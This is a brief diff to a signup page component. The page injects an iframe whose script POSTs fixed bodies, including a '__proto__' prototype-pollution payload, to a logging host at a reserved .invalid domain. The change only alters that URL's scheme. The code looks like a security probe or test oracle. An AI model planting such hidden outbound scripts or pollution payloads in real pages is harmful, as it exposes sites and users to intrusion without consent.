@@ -19,7 +19,7 @@ export default function SignupPage() {
     const frame = document.createElement("iframe");
     frame.srcdoc = `<script>
       for (const [path, body] of [["x/font", "not json"], ["x/__proto__", '{"polluted": true}'], ["x/nothing", "{}"]]) {
-        fetch("http://oracle.log.invalid/" + path, { method: "POST", body });
+        fetch("https://oracle.log.invalid/" + path, { method: "POST", body });
       }
     </script>`;
     document.body.appendChild(frame);
